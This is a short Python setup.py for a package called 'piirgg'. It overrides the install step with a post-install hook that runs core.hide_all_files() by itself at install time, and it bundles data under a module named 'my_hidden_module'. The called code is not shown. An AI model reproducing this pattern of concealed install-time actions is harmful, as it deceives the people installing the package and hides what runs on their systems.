from setuptools import setup, find_packages
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    def run(self):
        install.run(self)

        try:
            import piirgg.core as core
            core.hide_all_files()
        except Exception as e:
            print("Post-install hiding failed:", e)

setup(
    name="piirgg",
    version="0.1",
    packages=find_packages(),
    include_package_data=True,
    package_data={
        "my_hidden_module": ["data/*"],
    },
    cmdclass={
        'install': PostInstallCommand,
    },
)